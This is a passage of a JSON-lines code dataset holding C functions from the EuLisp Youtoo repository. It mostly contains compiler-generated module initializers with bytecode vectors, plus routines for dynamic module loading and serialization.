list_bindings[ 93] = G004467;\n  list_bindings[ 94] = G004469;\n  list_bindings[ 95] = G004471;\n  list_bindings[ 96] = G004473;\n  list_bindings[ 97] = G004475;\n  list_bindings[ 98] = G004477;\n  list_bindings[ 99] = G004479;\n  list_bindings[ 100] = G004481;\n  list_bindings[ 101] = G004483;\n  list_bindings[ 102] = G004485;\n  list_bindings[ 103] = G004487;\n  list_bindings[ 104] = G004489;\n  list_bindings[ 105] = G004491;\n  list_bindings[ 106] = G004493;\n  list_bindings[ 107] = G004495;\n  list_bindings[ 108] = G004497;\n  list_bindings[ 109] = G004499;\n  list_bindings[ 110] = sym_4502;\n  list_bindings[ 111] = sym_4503;\n  list_bindings[ 112] = sym_4504;\n  list_bindings[ 113] = sym_4505;\n  list_bindings[ 114] = sym_4506;\n  list_bindings[ 115] = sym_4507;\n  list_bindings[ 116] = sym_4508;\n  list_bindings[ 117] = sym_4509;\n  list_bindings[ 118] = sym_4510;\n  list_bindings[ 119] = sym_4511;\n  list_bindings[ 120] = sym_4512;\n  list_bindings[ 121] = sym_4513;\n  list_bindings[ 122] = sym_4514;\n  list_bindings[ 123] = sym_4515;\n  list_bindings[ 124] = sym_4516;\n  list_bindings[ 125] = sym_4517;\n  list_bindings[ 126] = sym_4518;\n  list_bindings[ 127] = sym_4519;\n  list_bindings[ 128] = sym_4520;\n  list_bindings[ 129] = sym_4521;\n  list_bindings[ 130] = sym_4522;\n  list_bindings[ 131] = sym_4523;\n  list_bindings[ 132] = sym_4524;\n  list_bindings[ 133] = sym_4525;\n  list_bindings[ 134] = sym_4526;\n  list_bindings[ 135] = sym_4527;\n  list_bindings[ 136] = sym_4528;\n  list_bindings[ 137] = sym_4529;\n  list_bindings[ 138] = sym_4530;\n  list_bindings[ 139] = sym_4531;\n  list_bindings[ 140] = sym_4532;\n  list_bindings[ 141] = sym_4533;\n  list_bindings[ 142] = sym_4534;\n  list_bindings[ 143] = sym_4535;\n  list_bindings[ 144] = sym_4536;\n  list_bindings[ 145] = sym_4537;\n  list_bindings[ 146] = sym_4538;\n  list_bindings[ 147] = sym_4539;\n  list_bindings[ 148] = sym_4540;\n  list_bindings[ 149] = sym_4541;\n  list_bindings[ 150] = sym_4542;\n  list_bindings[ 151] = sym_4543;\n  list_bindings[ 152] = sym_4544;\n  list_bindings[ 153] = sym_4545;\n  list_bindings[ 154] = sym_4546;\n  list_bindings[ 155] = sym_4547;\n  list_bindings[ 156] = sym_4549;\n  list_bindings[ 157] = sym_4551;\n  list_bindings[ 158] = cons_4548;\n  list_bindings[ 159] = cons_4552;\n  list_bindings[ 160] = sym_4554;\n  list_bindings[ 161] = sym_4555;\n  list_bindings[ 162] = sym_4556;\n  list_bindings[ 163] = sym_4557;\n  list_bindings[ 164] = sym_4558;\n  list_bindings[ 165] = G004501;\n  list_bindings[ 166] = G004560;\n  list_bindings[ 167] = G004562;\n  list_bindings[ 168] = G004564;\n  list_bindings[ 169] = G004566;\n  list_bindings[ 170] = G004568;\n  list_bindings[ 171] = G004570;\n  list_bindings[ 172] = G004572;\n  list_bindings[ 173] = G004574;\n  list_bindings[ 174] = G004576;\n  list_bindings[ 175] = G004578;\n  list_bindings[ 176] = G004580;\n  list_bindings[ 177] = G004582;\n  list_bindings[ 178] = G004584;\n  list_bindings[ 179] = G004586;\n  list_bindings[ 180] = G004588;\n  list_bindings[ 181] = G004590;\n  list_bindings[ 182] = G004592;\n  list_bindings[ 183] = G004594;\n  list_bindings[ 184] = G004596;\n  list_bindings[ 185] = G004598;\n  list_bindings[ 186] = G004600;\n  list_bindings[ 187] = G004602;\n  list_bindings[ 188] = G004604;\n  list_bindings[ 189] = G004606;\n  list_bindings[ 190] = G004608;\n  list_bindings[ 191] = G004610;\n  list_bindings[ 192] = G004612;\n  list_bindings[ 193] = G004614;\n  list_bindings[ 194] = G004616;\n  list_bindings[ 195] = G004618;\n  list_bindings[ 196] = G004620;\n  list_bindings[ 197] = G004622;\n  list_bindings[ 198] = G004624;\n  list_bindings[ 199] = G004626;\n  list_bindings[ 200] = G004628;\n  list_bindings[ 201] = G004630;\n  list_bindings[ 202] = G004632;\n  list_bindings[ 203] = G004634;\n  list_bindings[ 204] = G004636;\n  list_bindings[ 205] = G004638;\n  list_bindings[ 206] = G004640;\n  list_bindings[ 207] = G004642;\n  list_bindings[ 208] = G004644;\n  list_bindings[ 209] = G004646;\n  list_bindings[ 210] = G004648;\n  list_bindings[ 211] = G004650;\n  list_bindings[ 212] = G004652;\n  list_bindings[ 213] = G004654;\n  list_bindings[ 214] = G004656;\n  list_bindings[ 215] = G004658;\n  list_bindings[ 216] = G004660;\n  list_bindings[ 217] = G004662;\n  list_bindings[ 218] = G004664;\n  list_bindings[ 1] = eul_nil;\n  list_bindings[ 219] = sym_4667;\n  list_bindings[ 220] = sym_4668;\n  list_bindings[ 221] = sym_4669;\n  list_bindings[ 222] = sym_4670;\n  list_bindings[ 223] = sym_4671;\n  list_bindings[ 224] = sym_4672;\n  list_bindings[ 225] = sym_4673;\n  list_bindings[ 226] = sym_4674;\n  list_bindings[ 227] = sym_4675;\n  list_bindings[ 228] = sym_4676;\n  list_bindings[ 229] = sym_4677;\n  list_bindings[ 230] = sym_4678;\n  list_bindings[ 231] = sym_4679;\n  list_bindings[ 232] = sym_4680;\n  list_bindings[ 233] = sym_4681;\n  list_bindings[ 234] = sym_4682;\n  list_bindings[ 235] = sym_4683;\n  list_bindings[ 236] = sym_4684;\n  list_bindings[ 237] = sym_4685;\n  list_bindings[ 238] = sym_4686;\n  list_bindings[ 239] = sym_4687;\n  list_bindings[ 240] = sym_4688;\n  list_bindings[ 241] = sym_4689;\n  list_bindings[ 242] = sym_4690;\n  list_bindings[ 243] = sym_4691;\n  list_bindings[ 244] = sym_4692;\n  list_bindings[ 245] = sym_4693;\n  list_bindings[ 246] = sym_4694;\n  list_bindings[ 247] = sym_4695;\n  list_bindings[ 248] = sym_4696;\n  list_bindings[ 249] = sym_4697;\n  list_bindings[ 250] = sym_4698;\n  list_bindings[ 251] = sym_4699;\n  list_bindings[ 252] = sym_4700;\n  list_bindings[ 253] = sym_4701;\n  list_bindings[ 254] = sym_4702;\n  list_bindings[ 255] = sym_4703;\n  list_bindings[ 256] = sym_4704;\n  list_bindings[ 257] = sym_4705;\n  list_bindings[ 258] = sym_4706;\n  list_bindings[ 259] = sym_4707;\n  list_bindings[ 260] = sym_4708;\n  list_bindings[ 261] = sym_4709;\n  list_bindings[ 262] = sym_4710;\n  eul_allocate_lambda( list_bindings[0], \"initialize-list\", 0, G004666);\n\n  }\n}", "path": "Youtoo\\Runtime\\u2\\list.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module telos0 */\n", "func_signal": "void initialize_module_telos0()", "code": "{\n  if (is_initialized) return;\n  initialize_module_boot0();\n  initialize_module_mop_gf0();\n  initialize_module_mop_meth0();\n  initialize_module_mop_defcl0();\n  eul_fast_table_set(eul_modules,\"telos0\",(LispRef) telos0_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef G00455;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 23 is_init: 1 index: 0 binding: initialize-telos0 */\n  static const void *G00454[] = {I(87,25,00,00),B(telos0 ,1),I(24,00,00,00),B(mop_defcl0 ,1),I(3e,0b,24,00),B(mop_defcl0 ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_meth0 ,1),I(3e,0b,24,00),B(mop_meth0 ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_gf0 ,1),I(3e,0b,24,00),B(mop_gf0 ,0),I(3c,00,21,01),I(24,00,00,00),B(boot0 ,1),I(3e,0b,24,00),B(boot0 ,0),I(3c,00,21,01),I(86,ac,00,00)};\n\n\n  /* Initializations */\n  eul_allocate_bytevector( G00455,G00454);\n\n  /* Set local bindings */\n  telos0_bindings[ 1] = eul_nil;\n  eul_allocate_lambda( telos0_bindings[0], \"initialize-telos0\", 0, G00455);\n\n  }\n}", "path": "Youtoo\\Telos\\u2\\telos0.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module syntax-0 */\n", "func_signal": "void initialize_module_syntax_0()", "code": "{\n  if (is_initialized) return;\n  eul_fast_table_set(eul_modules,\"syntax_0\",(LispRef) syntax_0_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef G002;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 3 is_init: 1 index: 0 binding: initialize-syntax-0 */\n  static const void *G001[] = {I(87,25,00,00),B(syntax_0 ,1),I(86,ac,00,00)};\n\n\n  /* Initializations */\n  eul_allocate_bytevector( G002,G001);\n\n  /* Set local bindings */\n  syntax_0_bindings[ 1] = eul_nil;\n  eul_allocate_lambda( syntax_0_bindings[0], \"initialize-syntax-0\", 0, G002);\n\n  }\n}", "path": "Youtoo\\Runtime\\u2\\syntax-0.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Dynamically load a module (local literals not initialized!)\n///-----------------------------------------------------------------------------\n", "func_signal": "int eul_dyn_load_module(char *module_name, char *file_name)", "code": "{\n    FILE *fp = fopen(file_name, \"r\");\n    int res = load_compiled_module(module_name, fp);\n    fclose(fp);\n\n    if (res)\n    {\n        return (binding_vector_size);\n    }\n    else\n    {\n        return (0);\n    }\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Look for \"Byte-vector with size: %d is_init: %d index: %d binding_name: %s\"\n///-----------------------------------------------------------------------------\n", "func_signal": "int create_next_bytevector(LispRef * bv_ptr, FILE * fp, LispRef * binding_vec)", "code": "{\n    while (fgets(buf, 18, fp) != NULL && strncmp(buf, \"  /* Byte-vector \", 17));\n\n    if (buf == NULL)\n    {\n        return 0;\n    }\n\n    int size, index;\n\n    fscanf\n    (\n        fp,\n        \"with size: %d is_init: %d index: %d binding: %s */\\n\",\n        &size,\n        &is_init_bv,\n        &index,\n        buf\n    );\n\n    int byte_size = sizeof(LispRef) * size;\n    eul_allocate_bytevector1(*bv_ptr, (char *)gc_malloc(byte_size), byte_size);\n\n    if (index)\n    {\n        binding_vec[index] = *bv_ptr;\n    }\n    else\n    {\n        char *binding_name;\n\n        binding_name = (char *)gc_malloc(strlen(buf) + 1);\n        strcpy(binding_name, buf);\n\n        // Change method names like (method-foo) into (method foo)\n        if (*binding_name == '(')\n        {\n            *(binding_name + 7) = ' ';\n        }\n\n        eul_allocate_lambda(binding_vec[0], binding_name, 0, *bv_ptr);\n    }\n\n    return size;\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Compare two module vectors\n///-----------------------------------------------------------------------------\n", "func_signal": "static int compare_module_vectors(LispRef *x, LispRef *y)", "code": "{\n    ptrInt addr1 = (ptrInt)TABLE_ENTRY_VALUE(*x);\n    ptrInt addr2 = (ptrInt)TABLE_ENTRY_VALUE(*y);\n\n    WITH_DEBUG\n    (\n        fprintf\n        (\n            stderr,\n            \"comparing %\"ptrIntPM\"d and %\"ptrIntPM\"d ... \",\n            addr1,\n            addr2\n        )\n    );\n    fflush(stdout);\n\n    int res = (addr1 < addr2) ? -1 : 1;\n    WITH_DEBUG(fprintf(stderr, \"%d\\n\", res));\n\n    return res;\n}", "path": "Modules\\OS\\eul-serial2.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Create run-time module (i.e. allocate and register binding vector)\n///-----------------------------------------------------------------------------\n", "func_signal": "LispRef *eul_dyn_create_module(char *module_name, int size)", "code": "{\n    // printf(\".Create module %s with size %d\\n\", module_name, size);\n    LispRef *binding_vec = (LispRef *) gc_malloc(size * sizeof(LispRef *));\n\n    // Set local bindings\n    binding_vec[0] = eul_true;\n    for (int i = 1; i < size; i++)\n    {\n        binding_vec[i] = eul_nil;\n    }\n\n    eul_fast_table_set\n    (\n        eul_modules,\n        as_C_module_name(module_name),\n        (LispRef)binding_vec\n    );\n\n    return binding_vec;\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module mop-access */\n", "func_signal": "void initialize_module_mop_access()", "code": "{\n  if (is_initialized) return;\n  initialize_module_boot();\n  initialize_module_mop_prim();\n  initialize_module_mop_key();\n  initialize_module_mop_class();\n  initialize_module_mop_inspect();\n  initialize_module_mop_gf();\n  initialize_module_mop_meth();\n  initialize_module_mop_defcl();\n  eul_fast_table_set(eul_modules,\"mop_access\",(LispRef) mop_access_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef sym_3043, sym_3042, sym_3041, sym_3040, G003039, G003035, G003032, G003030, G003028, G003026, sym_3024, sym_3023, sym_3022, sym_3021, sym_3020, sym_3019, sym_3018, sym_3017, sym_3016, sym_3015, sym_3014, sym_3013, sym_3012, sym_3011, sym_3010, sym_3009, sym_3008, sym_3007, G003006, G003004, G003002, G003000, G002998, G002996, G002994, G002992, G002990, G002988, G002986, G002984, G002982, G002980, G002978, G002976, G002974, G002972, G002970, G002968, sym_2966, G002965, G002963;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 9 is_init: 0 index: 14 binding: anonymous */\n  static const void *G002962[] = {I(ab,1b,10,1b),I(82,02,47,00),I(01,1c,50,1b),I(44,05,1f,04),I(36,0e,1f,04),I(83,14,1f,04),I(11,47,00,00),I(3d,02,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 16 binding: (method-compute-primitive-writer-using-class) */\n  static const void *G002964[] = {I(43,03,46,03),I(1c,82,02,1b),I(48,00,01,86),I(1b,48,00,00),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,14),I(3b,02,48,00),I(00,82,1f,03),I(47,00,00,3c),I(02,24,00,00),B(mop_defcl ,3),I(3d,01,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 4 is_init: 0 index: 17 binding: (method-compute-primitive-writer-using-slot) */\n  static const void *G002967[] = {I(43,03,1c,1f),I(03,1d,24,00),B(mop_access ,13),I(3d,03,03,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 18 binding: (method-ensure-slot-writer) */\n  static const void *G002969[] = {I(43,04,1b,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 19 binding: anonymous */\n  static const void *G002971[] = {I(ab,47,00,00),I(3d,02,00,00)};\n\n  /* Byte-vector with size: 27 is_init: 0 index: 20 binding: (method-ensure-slot-writer) */\n  static const void *G002973[] = {I(43,04,46,01),I(1b,8a,05,02),I(1b,44,04,86),I(36,5b,1f,03),I(1f,05,1f,04),I(24,00,00,00),B(mop_access ,7),I(3c,03,1b,48),I(00,00,1d,8a),I(03,02,84,1f),I(07,86,24,00),B(boot1 ,40),I(3c,03,24,00),B(boot1 ,26),I(3c,00,1d,1d),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,19),I(3b,02,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,1f,06),I(1c,24,00,00),B(mop_meth ,8),I(3c,02,22,05),I(2a,1c,45,05)};\n\n  /* Byte-vector with size: 9 is_init: 0 index: 21 binding: anonymous */\n  static const void *G002975[] = {I(ab,1b,10,1b),I(82,02,47,00),I(01,1c,50,1b),I(44,05,1f,04),I(36,0e,1f,04),I(83,14,1f,04),I(11,47,00,00),I(3d,02,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 22 binding: (method-compute-primitive-reader-using-class) */\n  static const void *G002977[] = {I(43,03,46,03),I(1c,82,02,1b),I(48,00,01,86),I(1b,48,00,00),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,21),I(3b,02,48,00),I(00,82,1f,03),I(47,00,00,3c),I(02,24,00,00),B(mop_defcl ,6),I(3d,01,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 4 is_init: 0 index: 23 binding: (method-compute-primitive-reader-using-slot) */\n  static const void *G002979[] = {I(43,03,1c,1f),I(03,1d,24,00),B(mop_access ,9),I(3d,03,03,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 24 binding: (method-ensure-slot-reader) */\n  static const void *G002981[] = {I(43,04,1b,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 25 binding: anonymous */\n  static const void *G002983[] = {I(aa,47,00,00),I(3d,01,00,00)};\n\n  /* Byte-vector with size: 27 is_init: 0 index: 26 binding: (method-ensure-slot-reader) */\n  static const void *G002985[] = {I(43,04,46,01),I(1b,8a,05,02),I(1b,44,04,86),I(36,5b,1f,03),I(1f,05,1f,04),I(24,00,00,00),B(mop_access ,4),I(3c,03,1b,48),I(00,00,1d,8a),I(03,02,83,1f),I(07,24,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,1d,1d),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,25),I(3b,01,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,1f,06),I(1c,24,00,00),B(mop_meth ,8),I(3c,02,22,05),I(2a,1c,45,05)};\n\n  /* Byte-vector with size: 9 is_init: 0 index: 27 binding: anonymous */\n  static const void *G002987[] = {I(ab,1b,10,1b),I(84,02,47,00),I(01,1c,50,1b),I(44,05,1f,04),I(36,0e,1f,04),I(83,14,1f,04),I(11,47,00,00),I(3d,02,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 28 binding: (method-compute-slot-writer) */\n  static const void *G002989[] = {I(43,03,46,03),I(1c,84,02,1b),I(48,00,01,86),I(1b,48,00,00),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,27),I(3b,02,48,00),I(00,82,1f,03),I(47,00,00,3c),I(02,24,00,00),B(mop_defcl ,3),I(3d,01,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 20 is_init: 0 index: 29 binding: (method-compute-slot-writer) */\n  static const void *G002991[] = {I(43,03,84,1f),I(03,24,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,03,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,15),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,45),I(07,00,00,00)};\n\n  /* Byte-vector with size: 9 is_init: 0 index: 30 binding: anonymous */\n  static const void *G002993[] = {I(ab,1b,10,1b),I(84,02,47,00),I(01,1c,50,1b),I(44,05,1f,04),I(36,0e,1f,04),I(83,14,1f,04),I(11,47,00,00),I(3d,02,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 31 binding: (method-compute-slot-reader) */\n  static const void *G002995[] = {I(43,03,46,03),I(1c,84,02,1b),I(48,00,01,86),I(1b,48,00,00),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,30),I(3b,02,48,00),I(00,82,1f,03),I(47,00,00,3c),I(02,24,00,00),B(mop_defcl ,6),I(3d,01,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 32 binding: (method-compute-slot-reader) */\n  static const void *G002997[] = {I(43,03,83,1f),I(03,24,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,15),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,45),I(07,00,00,00)};\n\n  /* Byte-vector with size: 2 is_init: 0 index: 33 binding: anonymous */\n  static const void *G002999[] = {I(ab,82,02,50),I(45,00,00,00)};\n\n  /* Byte-vector with size: 37 is_init: 0 index: 34 binding: anonymous */\n  static const void *G003001[] = {I(aa,1b,82,02),I(47,00,02,10),I(1c,1c,23,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,33),I(3b,02,24,00),B(boot ,27),I(3c,03,1b,44),I(04,86,36,36),I(47,00,00,1f),I(04,47,00,01),I(24,00,00,00),B(mop_access ,12),I(3c,03,47,00),I(00,1f,05,47),I(00,01,24,00),B(mop_access ,11),I(3c,03,1f,05),I(1d,1c,82,1d),I(03,22,02,2a),I(1f,05,1c,1c),I(83,1d,03,22),I(04,2a,1f,03),I(82,02,47,00),I(00,1f,05,47),I(00,01,1f,03),I(24,00,00,00),B(mop_access ,2),I(3c,04,2a,1f),I(04,83,02,47),I(00,00,1f,06),I(47,00,01,1f),I(03,24,00,00),B(mop_access ,6),I(3d,04,06,45),I(06,00,00,00)};\n\n  /* Byte-vector with size: 13 is_init: 0 index: 35 binding: (method-compute-and-ensure-slot-accessors) */\n  static const void *G003003[] = {I(43,03,46,03),I(1d,48,00,00),I(1c,48,00,01),I(1b,48,00,02),I(23,00,00,00),B(mop_access ,15),I(23,00,00,00),B(mop_access ,34),I(3b,01,47,00),I(01,24,00,00),B(boot ,17),I(3c,02,2a,47),I(00,01,45,03)};\n\n  /* Byte-vector with size: 601 is_init: 0 index: 54 binding: top-level */\n  static const void *G003005[] = {I(a9,8a,03,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,36),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,10),I(2a,8a,03,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,37),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,12),I(2a,8a,03,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,38),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,11),I(2a,8a,04,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(mop_class ,32),I(24,00,00,00),B(boot1 ,40),I(3c,05,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,39),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,2),I(2a,8a,03,24),B(mop_class ,57),I(24,00,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,40),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,4),I(2a,8a,03,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,41),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,9),I(2a,8a,04,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(mop_class ,32),I(24,00,00,00),B(boot1 ,40),I(3c,05,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,42),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,6),I(2a,8a,03,24),B(mop_class ,57),I(24,00,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,43),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,7),I(2a,8a,03,24),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_access ,44),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_access ,13),I(2a,24,00,00),B(mop_access ,10),I(2a,24,00,00),B(mop_access ,10),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(86,86,24,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,10),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,45),I(23,00,00,00),B(mop_access ,35),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,10),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,12),I(2a,24,00,00),B(mop_access ,12),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,12),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,46),I(23,00,00,00),B(mop_access ,32),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,12),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,12),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,59),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,12),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,46),I(23,00,00,00),B(mop_access ,31),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,12),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,11),I(2a,24,00,00),B(mop_access ,11),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,11),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,47),I(23,00,00,00),B(mop_access ,29),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,11),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,11),I(8a,03,02,8a),I(03,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,59),I(86,24,00,00),B(boot1 ,40),I(3c,04,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,11),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,47),I(23,00,00,00),B(mop_access ,28),I(3b,03,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(mop_access ,11),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(mop_access ,2),I(2a,24,00,00),B(mop_access ,2),I(8a,03,02,8a),I(04,24,00,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,57),I(86,24,00,00),B(mop_class ,51),I(24,00,00,00),B(boot1 ,40),I(3c,05,24,00),B(boot1 ,26),I(3c,00,24,00),B(mop_access ,2),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(mop_access ,48),I(23,00,00,00),B(mop_access ,26),I(3b,04,1f,03),I(24,00,00,00),B(mop_meth 